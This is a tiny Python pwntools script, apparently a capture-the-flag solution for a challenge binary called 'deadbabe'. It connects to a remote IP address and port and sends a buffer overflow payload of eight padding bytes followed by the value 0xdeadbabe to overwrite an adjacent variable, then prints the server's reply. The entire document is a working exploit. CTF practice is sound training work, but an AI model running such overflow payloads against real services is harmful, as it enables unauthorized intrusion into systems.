from pwn import *

#p = process('./deadbabe')
p = remote('45.55.130.243', 37234)
p.sendlineafter(b': ', "A" * 8 + "\xbe\xba\xad\xde")
print(p.recvall().decode())